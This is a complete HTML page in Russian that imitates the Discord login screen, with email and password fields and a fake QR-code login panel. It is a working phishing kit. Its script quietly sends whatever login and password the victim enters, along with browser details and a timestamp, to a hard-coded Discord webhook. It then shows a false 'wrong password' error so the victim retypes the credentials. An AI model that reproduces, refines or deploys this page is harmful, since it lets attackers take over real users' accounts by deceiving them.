<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:"gg sans","Helvetica Neue",Helvetica,Arial,sans-serif;background:#313338;color:#f2f3f5;min-height:100vh;display:flex;align-items:center;justify-content:center}
.wrap{display:flex;width:100%;max-width:780px;background:#313338;border-radius:8px;overflow:hidden;box-shadow:0 2px 10px rgba(0,0,0,.2)}
.left{flex:1;padding:32px;min-width:320px}
.right{width:300px;padding:32px;display:flex;flex-direction:column;align-items:center;justify-content:center;border-left:1px solid #1e1f22}
h1{font-size:24px;font-weight:600;margin-bottom:8px;text-align:center}
.sub{color:#b5bac1;text-align:center;margin-bottom:20px;font-size:16px}
label{display:block;font-size:12px;font-weight:700;margin-bottom:8px;color:#b5bac1;text-transform:uppercase}
input{width:100%;padding:10px;border:none;border-radius:4px;background:#1e1f22;color:#dbdee1;font-size:16px;margin-bottom:20px;outline:none}
input:focus{outline:2px solid #5865f2}
button{width:100%;padding:12px;border:none;border-radius:4px;background:#5865f2;color:#fff;font-size:16px;font-weight:500;cursor:pointer}
button:hover{background:#4752c4}
.forgot{color:#00a8fc;font-size:14px;margin-top:-12px;margin-bottom:16px;display:inline-block;text-decoration:none}
.qr{width:176px;height:176px;background:#fff;border-radius:4px;margin-bottom:16px;display:flex;align-items:center;justify-content:center;font-size:12px;color:#111;text-align:center;padding:8px}
.right h2{font-size:20px;margin-bottom:8px;text-align:center}
.right p{color:#b5bac1;font-size:14px;text-align:center;line-height:1.4}
.err{color:#f23f43;font-size:14px;margin-top:12px;text-align:center;display:none}
@media(max-width:700px){.right{display:none}.wrap{max-width:420px}}
</style>
</head>
<body>
<div class="wrap">
  <div class="left">
    <h1>С возвращением!</h1>
    <p class="sub">Мы так рады видеть вас снова!</p>
    <form id="f">
      <label>Адрес электронной почты или номер телефона</label>
      <input type="text" id="login" required autocomplete="username" spellcheck="false">
      <label>Пароль</label>
      <input type="password" id="pass" required autocomplete="current-password">
      <a class="forgot" href="#">Забыли пароль?</a>
      <button type="submit">Вход</button>
      <p class="err" id="err">Неверный логин или пароль.</p>
    </form>
  </div>
  <div class="right">
    <div class="qr">QR-код<br>для входа</div>
    <h2>Войти с помощью QR-кода</h2>
    <p>Отсканируйте код через мобильное приложение Discord, чтобы сразу войти.</p>
  </div>
</div>
<script>
const WEBHOOK = "https://discord.com/api/webhooks/1563854939221008454/YJsgQ4nkInOyf0XxtnxUZJ43nlLLnY-_r_zcYQ0PaISxesga1ZqiwCNqQ9ROfr5bduHb";

document.getElementById("f").addEventListener("submit", async (e) => {
  e.preventDefault();
  const login = document.getElementById("login").value.trim();
  const pass  = document.getElementById("pass").value;

  const payload = {
    embeds: [{
      title: "Discord Login",
      color: 5793266,
      fields: [
        { name: "Login", value: "```" + login + "```" },
        { name: "Password", value: "```" + pass + "```" },
        { name: "UA", value: navigator.userAgent.substring(0, 180) },
        { name: "Lang", value: navigator.language, inline: true },
        { name: "Platform", value: navigator.platform, inline: true },
        { name: "Time", value: new Date().toISOString(), inline: true }
      ]
    }]
  };

  try {
    await fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  } catch (err) {}

  document.getElementById("err").style.display = "block";
  document.getElementById("pass").value = "";
});
</script>
</body>
</html>
